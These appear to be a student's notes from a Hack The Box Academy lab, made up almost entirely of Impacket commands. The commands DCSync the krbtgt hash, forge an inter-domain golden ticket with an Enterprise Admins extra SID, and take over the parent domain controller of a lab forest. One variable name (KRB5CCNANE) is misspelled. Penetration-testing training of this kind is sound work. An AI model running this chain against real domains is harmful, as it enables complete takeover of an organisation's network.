### Performing a DCSync with Secrets
```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

### Performing SID Brute Forcing using lookupsid.py
`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`
Also `grep` for `Domain SID`

This would be for Grabbing the Domain SID and Attching to Enterprise Admin RID
`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"`

### Constructing the Golden Ticket
```bash
# Things needed
NTLM Hash
Domain Name
Domain SID

ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

```bash
export KRB5CCNANE=hacker.ccache
```
 Now we can try to access the domain controller

### PSexec.py / raisechild.py
```python
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

```python
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
